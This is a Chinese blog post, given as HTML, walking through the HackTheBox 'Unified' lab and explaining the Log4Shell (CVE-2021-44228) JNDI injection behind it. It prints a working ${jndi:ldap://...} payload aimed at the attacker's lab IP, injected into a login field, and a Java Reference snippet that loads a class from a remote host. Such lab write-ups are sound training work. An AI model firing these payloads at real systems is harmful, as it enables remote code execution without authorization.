@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,zh-TW,default">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="DarkAP">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="DarkAP">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="欢迎你的到来，希望能对你有些许帮助">
+    <meta name="description" content="前言htb 起点的靶机免费的做完了 目前为止，这是我做过起点里面最难的一个 也是免费的靶机里面最难的一个 其实做了这个靶机之后发现 我们的思维还是没有打开 之前很多很多渗透的点还是没有想到 TASK1最早开放的是哪四个端口 22 6789 8080 8443 直接nmap扫描，然后就出来了 其实我也扫描过一些其他的真实的机器 给我最大的感触就是，还是有和很多的服务和协议不了解 每当面临这些东西的时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Labs(unified)">
+<meta property="og:url" content="https://darkamp.github.io/2023/08/17/unified/index.html">
+<meta property="og:site_name" content="DarkAP">
+<meta property="og:description" content="前言htb 起点的靶机免费的做完了 目前为止，这是我做过起点里面最难的一个 也是免费的靶机里面最难的一个 其实做了这个靶机之后发现 我们的思维还是没有打开 之前很多很多渗透的点还是没有想到 TASK1最早开放的是哪四个端口 22 6789 8080 8443 直接nmap扫描，然后就出来了 其实我也扫描过一些其他的真实的机器 给我最大的感触就是，还是有和很多的服务和协议不了解 每当面临这些东西的时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE29bdec9ad777e4112e330efc28749fc4%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE1be7d939224f29ac385be3bfb5c886c9%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEedd05b79ad20e6c87de3c26b29b7c429%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEe406cc8c9cb013286bebd0d727e98616%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEfb4f2fddad80b2b1ff0c28a8425b39b3%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE5d8ec2ccecbfa21f1f54252d4b52d762%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEf60aa3634870c4acecbeb08c857e8d82%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE75bcce3656f663b70afc1ff305553939%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE9dc0ab5e705a93c07c16c3dc55fb604a%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEb71d2783adc35b71747ae9139970b21c%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEfe693e1339928d97e8bb4a2006461575%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE5e347decb61bc21bfd200f123fdc38d68f50207e18a24f7f8b2099a6f5c7e4b8.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEcb912d42799c46a1a8c835cb80502603a65fa9d6322d4f4781fe1f0e61d82374.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE6479c49c4167638a0b81cc232a219e52996f08e06db84e94a625e7e234589ada.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE104edd0d5a3808a7931ddaf5a5aa46f21961d0694cd94f83a1237bfacf88daad.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE5e172cae9eefbbe09202a6807c7a5e7b6499b2e9efd74892b871f1ebff3297a4.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE95c2744a1d6842fe2f6c348134982e787daa224d117b4744969cf145cc9ef21e.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEfaddee9a91e068a56bf3b5654fa308ff38bbe1fc77f24dbb9404304d48080c88.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEca5db900d203e2ce70620bcc2fd24bfa355680e286bc43a5bd68647a21271ceb.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE5a2cdfe543a0f98a863aed587f7cbdb590e608478a3c45e0b48570611cf4c0cd.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE50c0a68bf495340ff0c093b751b59ee2234802d8684646fe8630d8606f245cd2.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE1f3c34222c8060cb5398d6320ac36b361a4df4f5e6d44f298e0e5de568536e13.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEd3b8119b20341dff3b5dbadee87d96852132f56ed61b488482ae399ca660739a.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEc1b453d6773165523e4c8e166b58e7e7df41275b83e94108be513600d4df5828.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE5406d3029357078382db928588ed85290361170713db4c89843ee60997330456.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE83386ffca58f832bf49e8d33fb0008dc259cf42ae7b640ccaf113fb3ee61d093.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEe1d7b824f01b11b178c896606367b716f5ec9c649b0c48ee9584104d3da1701d.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE6b4bc7cafe274cd2e7fb60930c66a466%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE126a671add4bb801b860e37e7d6edc35ee97e90600024abdb80016500ba90c24.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE4fb8cfd383afc7caa0c2b8e4153298df149b1e0b1ddd4c0f8f3ecdebe8afb961.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCEb8b87a80e93b6c2ec514a6e762916ec9a0fe0b4cd37740dc849e2f97dd91ffa9.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE252133bbe3fe9c986b2ce5b795a9aaa2%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://darkamp.github.io/images/WEBRESOURCE10851ecd2c273b30c3decc63e7601ab2537bbc49292a4dc9a4837de46d87922c.png">
+<meta property="article:published_time" content="2023-08-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-20T08:13:15.586Z">
+<meta property="article:author" content="DarkAP">
+<meta property="article:tag" content="Lab">
+<meta property="article:tag" content="HtbStartPorint">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://darkamp.github.io/images/WEBRESOURCE29bdec9ad777e4112e330efc28749fc4%E6%88%AA%E5%9B%BE.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/02.ico">
+    <title>HTB-Labs(unified) · DarkAP&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">DarkAP's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">DarkAP&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">HTB-Labs(unified)</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                HTB-Labs(unified)
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="Lab">Lab</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="HtbStartPorint">HtbStartPorint</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.2k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/08/17</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>htb 起点的靶机免费的做完了</strong></p>
+<p><strong>目前为止，这是我做过起点里面最难的一个</strong></p>
+<p><strong>也是免费的靶机里面最难的一个</strong></p>
+<p><strong>其实做了这个靶机之后发现</strong></p>
+<p><strong>我们的思维还是没有打开</strong></p>
+<p><strong>之前很多很多渗透的点还是没有想到</strong></p>
+<h1 id="TASK1"><a href="#TASK1" class="headerlink" title="TASK1"></a><strong>TASK1</strong></h1><p><strong>最早开放的是哪四个端口</strong></p>
+<p><strong>22 6789 8080 8443</strong></p>
+<p><strong>直接nmap扫描，然后就出来了</strong></p>
+<p><strong>其实我也扫描过一些其他的真实的机器</strong></p>
+<p><strong>给我最大的感触就是，还是有和很多的服务和协议不了解</strong></p>
+<p><strong>每当面临这些东西的时候，总给我一种他漏洞百出而我却找不出来的感觉</strong></p>
+<p><img src="/images/WEBRESOURCE29bdec9ad777e4112e330efc28749fc4%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK2"><a href="#TASK2" class="headerlink" title="TASK2"></a>TASK2</h1><p><strong>在端口8443上运行的软件的标题是什么？</strong></p>
+<p>**通过web访问就可以了 **UniFI network</p>
+<p><img src="/images/WEBRESOURCE1be7d939224f29ac385be3bfb5c886c9%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK3"><a href="#TASK3" class="headerlink" title="TASK3"></a><strong>TASK3</strong></h1><p><strong>正在运行的软件的版本是什么？</strong></p>
+<p><strong>这个上面有写</strong></p>
+<p><strong>6.4.54</strong></p>
+<p><img src="/images/WEBRESOURCEedd05b79ad20e6c87de3c26b29b7c429%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK4"><a href="#TASK4" class="headerlink" title="TASK4"></a><strong>TASK4</strong></h1><p><strong>漏洞的编号是什么？</strong></p>
+<p><strong>cve-2021-44228</strong></p>
+<p><strong>log4j的反序列化</strong></p>
+<p><img src="/images/WEBRESOURCEe406cc8c9cb013286bebd0d727e98616%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK5"><a href="#TASK5" class="headerlink" title="TASK5"></a><strong>TASK5</strong></h1><p><strong>JNDI在注入中利用了什么协议？LDAP</strong></p>
+<p><img src="/images/WEBRESOURCEfb4f2fddad80b2b1ff0c28a8425b39b3%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK6"><a href="#TASK6" class="headerlink" title="TASK6"></a>TASK6</h1><p><strong>我们使用什么工具拦截流量，表明攻击成功？</strong></p>
+<p><a href="note://WEB24ee8d5c3967c7cfec46449191dfea41">Tcpdump</a></p>
+<p><img src="/images/WEBRESOURCE5d8ec2ccecbfa21f1f54252d4b52d762%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK7"><a href="#TASK7" class="headerlink" title="TASK7"></a>TASK7</h1><p><strong>我们需要拦截哪个端口的流量</strong></p>
+<p>**389	**389端口就收到了数据报文，证明网站存在log4j漏洞</p>
+<p><img src="/images/WEBRESOURCEf60aa3634870c4acecbeb08c857e8d82%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="TASK8"><a href="#TASK8" class="headerlink" title="TASK8"></a>TASK8</h1><p><strong>MongoDB服务运行在哪个端口上？</strong></p>
+<p><strong>第一步就是访问web，然后尝试登录一下</strong></p>
+<p><strong>发现有remeber，抓个包</strong></p>
+<p><img src="/images/WEBRESOURCE75bcce3656f663b70afc1ff305553939%E6%88%AA%E5%9B%BE.png"></p>
+<p><strong>将remeber字段修改成payload</strong></p>
+<p><strong>${jndi:ldap:&#x2F;&#x2F;10.10.14.128&#x2F;o&#x3D;tomcat}</strong></p>
+<p><strong>然后在另起一个终端，使用tcpdump进行抓包</strong></p>
+<p><strong>看看是否被请求</strong></p>
+<p><img src="/images/WEBRESOURCE9dc0ab5e705a93c07c16c3dc55fb604a%E6%88%AA%E5%9B%BE.png"></p>
+<p><strong>这说明是有漏洞的</strong></p>
+<p><img src="/images/WEBRESOURCEb71d2783adc35b71747ae9139970b21c%E6%88%AA%E5%9B%BE.png"></p>
+<p><img src="/images/WEBRESOURCEfe693e1339928d97e8bb4a2006461575%E6%88%AA%E5%9B%BE.png"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h2><p><strong>虽然知道漏洞的利用方法，但是我们还是要了解一下他的原理</strong></p>
+<p><strong>Log4j2 远程代码执行漏洞（cve-2021-44228）</strong></p>
+<h3 id="1、JNDI、RMI、LDAP、JNDI注入？"><a href="#1、JNDI、RMI、LDAP、JNDI注入？" class="headerlink" title="1、JNDI、RMI、LDAP、JNDI注入？"></a>1、JNDI、RMI、LDAP、JNDI注入？</h3><p><strong>要了解本次Log4j2 rce的原理，首先我们得知道什么是JNDI，什么是JNDI注入，什么是RMI，什么又是LDAP…</strong></p>
+<p><strong>Java Name and Directory</strong><strong>(目录)</strong>** Interface****(接口)****：java命名和目录接口**</p>
+<p><strong>是sun公司提供的一种标准的java命名系统接口，JNDI提供统一的客户端API，通过访问JNDI，根据命名服务或目录服务来获取相应的资源。</strong></p>
+<p><strong>命名服务</strong><strong>：一种简单的键值对绑定（k，v），可以通过键名检索值，RMI（远程方法调用）就是典型的命名服务。</strong></p>
+<p><strong>目录服务</strong><strong>：目录服务是命名服务的拓展，区别在于它可以通过对象的属性来检索对象，其实就是键比较复杂，比如找一个学生：年级-&gt;班级-&gt;姓名来查找，			      													这些东西就是键，但是是层级关系，比较像目录。<strong><strong>LDAP</strong></strong>（轻量级目录访问协议）就是典型的目录服务。</strong></p>
+<p><strong>说白了，其实JNDI只是对各种访问目录服务的逻辑进行了再封装，就是以前访问LDAP和RMI要写的代码差别很大，但是有了JNDI这一层（没有什么是加一层解决不了的，如果有就再加一层），就可以使用JNDI的方式来轻松访问RMI或LDAP服务，访问的代码基本是一样的（参考JDBC连接不同的数据库）</strong></p>
+<p><img src="/images/WEBRESOURCE5e347decb61bc21bfd200f123fdc38d68f50207e18a24f7f8b2099a6f5c7e4b8.png"></p>
+<p><strong>可以简单的将LDAP理解为一个存储目录，里面有我们要的资源，而JNDI就是获取资源的一种途径或者说方式。</strong></p>
+<p><strong>如上图所示在访问RMI时只传了一个键foo过去，返回一个对象；</strong></p>
+<p><strong>在访问LDAP这种目录服务时，传过去的比较复杂，包含多个键值对，这些键值对就是对象的属性，LDAP根据这些属性来判断返回哪个对象。</strong></p>
+<p><strong>基本操作：</strong></p>
+<ol>
+<li><p><strong>发布服务：bind() 将名称绑定到对象中</strong></p>
+</li>
+<li><p><strong>用名字查找资源：lookup() 通过名字检索执行的对象</strong></p>
+</li>
+</ol>
+<p><strong>JNDI注入：</strong></p>
+<p><strong>动态协议转换：JNDI提前有配置初始化环境，设置了属性，但是**<strong>当lookup()里传进来的参数协议与初始化的Context里配置的协议不一致时</strong></strong>，就会<strong><strong>动态的进行转换来查找传进去的参数</strong></strong>，并且不会报错，所以<strong><strong>当参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类</strong></strong>。**</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(&quot;rmi://your-server/refObj&quot;);// 初始化的</span><br><span class="line">//ctx.lookup(&quot;ldap://your-server/cn=bar,dc=test,dc=org&quot;);//实际上传进来的</span><br></pre></td></tr></table></figure>
+
+<p><strong>命名引用：Java为了</strong><em><strong>将Object对象存储在Naming（命名）或Directory（目录）服务下</strong></em><strong>，提供了**<strong>Naming Reference（命名引用）功能</strong></strong>，对象可以通过<strong><strong>绑定Reference类存储在Naming或Directory服务下</strong></strong>，比如RMI、LDAP等。**</p>
+<p><strong>也就是说存储的V中可以是一个超链接，我们**<strong>根据K去查找V</strong></strong>，找到之后发现是引用就会去引用的地址继续找然后返回相应的资源。**</p>
+<p><strong>总结：</strong></p>
+<p><strong>在LDAP中可以存储外部的资源，叫做**<strong>命名引用</strong></strong>，对应Reference类。比如远程HTTP服务的一个.class文件**</p>
+<p><strong>如果JNDI客户端基于LDAP服务，找不到相应的资源，就会去LDAP中默认指定的地址请求（初始化配置的），如果是命名引用，会将这个文件下载到本地。</strong></p>
+<p><strong>如果下载的.class文件包含无参构造函数或静态代码块，加载的时候会自动执行。因为下载之后会进行自动实例化。</strong></p>
+<p><strong>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，<strong><strong>创建Reference实例时几个比较关键的属性</strong></strong>：</strong></p>
+<p><strong>className：远程加载时所使用的类名；</strong></p>
+<p><strong>classFactory：加载的class中需要实例化类的名称；</strong></p>
+<p><strong>classFactoryLocation：远程加载类的地址，提供class数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</strong></p>
+<p><strong>当然，要把一个对象绑定到rmi注册表中（前面提到对象可以通过绑定<strong><strong>Reference类</strong></strong>存储<strong><strong>在Naming或Directory</strong></strong>服务下），这个对象需要继UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到rmi注册表，并被远程访问到了，demo如下：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>,<span class="string">&quot;insClassName&quot;</span>,<span class="string">&quot;http://ip:port/&quot;</span>);</span><br><span class="line"><span class="comment">//第一个参数是远程加载时使用的类名，第二个参数是加载的class中需要实例化类的名称，第三个参数是远程class文件存放的地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj );<span class="comment">//进行包装继承</span></span><br><span class="line"></span><br><span class="line">registry.bind(<span class="string">&quot;refObj &quot;</span>,refObjWrapper );<span class="comment">//发布服务，将键与值绑定起来</span></span><br></pre></td></tr></table></figure>
+
